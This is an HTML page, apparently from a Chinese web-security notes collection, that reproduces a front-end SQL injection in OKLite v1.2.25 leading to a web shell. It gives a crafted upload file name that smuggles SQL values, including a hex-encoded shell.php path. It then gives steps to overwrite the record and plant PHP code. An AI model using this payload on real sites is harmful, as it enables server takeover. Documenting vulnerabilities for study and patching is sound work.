@@ -1,0 +1,31 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
+			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="oklite-v1225-sql注入导致getshell前台"><span class="csDE05BCC">OKLite v1.2.25 SQL</span><span class="csECDA2D3">注入导致</span><span class="csDE05BCC">getshell(</span><span class="csECDA2D3">前台</span><span class="csDE05BCC">)</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">这个漏洞在</span><span class="cs8926E06">2017</span><span class="cs9C1B1871">年在</span><span class="cs8926E06">PHPOK</span><span class="cs9C1B1871">当中就被畅师傅就被发现了。</span><span class="cs8926E06">PHPOK</span><span class="cs9C1B1871">系统被修复了，但是在</span><span class="cs8926E06">OKLite</span><span class="cs9C1B1871">当中还存在。</span></p><h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">OKLite v1.2.25 </span><span class="cs9C1B1871">版本</span></p><h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">地址：</span><span class="cs8926E06"><a class="cs508254C" href="http://www.0-sec.org/index.php?id=message"><span class="cs4B51D5E4">http://www.0-sec.org/index.php?id=message</span></a></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在线留言处上传一个图片并抓包，把文件名修改为：</span></p><p class="cs3A447A38"><span class="cs9FB05234">1&#39;,&#39;pf3qm0js3gb2s5f33r7lf14vl3&#39;,&#39;30&#39;),(&#39;1&#39;,0x7265732f3230313931302f30342f,&#39;shell.jpg&#39;,&#39;jpg&#39;,0x7265732f3230313931302f30352f7368656c6c2e706870,&#39;1570161575&#39;,&#39;abc</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OKLite/OKLite%20v1.2.25%20SQL%e6%b3%a8%e5%85%a5%e5%af%bc%e8%87%b4getshell(%e5%89%8d%e5%8f%b0)_files/image0.png" width="560" height="453" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上传成功之后会返回图片的</span><span class="cs8926E06">id</span><span class="cs9C1B1871">和保存的路径：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OKLite/OKLite%20v1.2.25%20SQL%e6%b3%a8%e5%85%a5%e5%af%bc%e8%87%b4getshell(%e5%89%8d%e5%8f%b0)_files/image1.png" width="560" height="294" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再次上传一个图片，把地址中的</span><span class="cs8926E06">save</span><span class="cs9C1B1871">改成</span><span class="cs8926E06">replace</span><span class="cs9C1B1871">，添加一个参数名为</span><span class="cs9FB05234">oldid</span><span class="cs9C1B1871">，值为图片的</span><span class="cs8926E06">id + 1</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图片的内容改为恶意的</span><span class="cs8926E06">php</span><span class="cs9C1B1871">代码：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/OKLite/OKLite%20v1.2.25%20SQL%e6%b3%a8%e5%85%a5%e5%af%bc%e8%87%b4getshell(%e5%89%8d%e5%8f%b0)_files/image2.png" width="560" height="306" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">上传完成之后可在</span><span class="cs9FB05234">res\201910\05</span><span class="cs9C1B1871">目录下生成一个</span><span class="cs8926E06">shell.php</span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
+</html>
